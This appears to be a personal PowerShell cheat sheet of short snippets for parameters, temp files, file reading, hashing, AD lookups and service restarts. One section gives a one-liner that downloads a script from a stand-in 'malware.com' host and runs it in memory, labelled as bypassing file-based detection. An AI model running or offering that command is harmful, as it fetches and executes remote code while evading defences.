# Powershell

## Parameters

	Param (
	    [string]$Right,
	    [switch]$Expand
	)

	Param (
	    [Parameter(Mandatory = $true)][string]$FileName
	)

	Param ([string]$ForceOverwrite = 'N')

	param (
		[string]$ServiceName,
		[int]$Delay = 10
	)

---

## Config
`$ErrorActionPreference='STOP'`

`$ProgressPreference='SilentlyContinue'`

---

## Temp File
`$TempPath = [System.IO.Path]::GetTempFileName()`

---

## Input Credentials
`$chiper = Read-Host -AsSecureString "Please input some text"`

---

## Get Extension
`$Extension = [System.IO.Path]::GetExtension($FilePath)`

---

## Placeholder Replacement
`"[{0}][{1}]" -f $link.innerText, $link.href`

---

## Write a Line
`Write-Host ("-" * 100)`

---

## Check Computer AD Path
`Get-ADComputer -Identity "$_" | Select-Object DistinguishedName`

---

## Read File
`Get-Content file.txt | ForEach-Object { }`

`Get-Content -Path {Path to the text file}`

`Get-ChildItem -Path {Path of the Directory}`

`(Get-Item {Path to the file}).CreationTime`

`Select-String -Path {Path} -Pattern "{Pattern}"`

```
$files = Get-ChildItem -Path {Path of the Directory} -Recurse -File
$report = foreach ($file in $files) {
  Get-FileHash -Path $file.FullName
}
$report | Out-File -FilePath {Path\To\Report.txt}
```

---

## Restart Service
`Stop-Service $ServiceName`

`Start-Service $ServiceName`

---

## Sleep
`Start-Sleep -Seconds 10`

---

## Bypasses file-based detection and executes malicious code directly in memory
`iex((New-Object Net.WebClient).DownloadString('https://malware.com/payload.ps1'))`

---

## Hash
`Get-FileHash -Algorithm MD5 -Path {Path to the file}`
